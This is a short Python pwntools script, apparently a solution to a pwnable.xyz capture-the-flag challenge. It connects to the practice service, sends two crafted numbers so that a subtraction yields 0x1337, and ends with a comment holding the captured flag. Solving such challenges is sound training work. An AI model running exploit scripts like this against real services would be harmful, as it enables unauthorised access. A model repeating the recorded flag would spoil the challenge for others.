from pwn import *

conn = remote("svc.pwnable.xyz",30001)

conn.recvuntil(":")
# -1-(-4920) = 4920-1 = 4919 (ie. 0x1337)
conn.sendline("-1")
conn.sendline("-4920")
conn.interactive()

#flag.txtread = 7cde191de87fe3ddac26e19acae1525e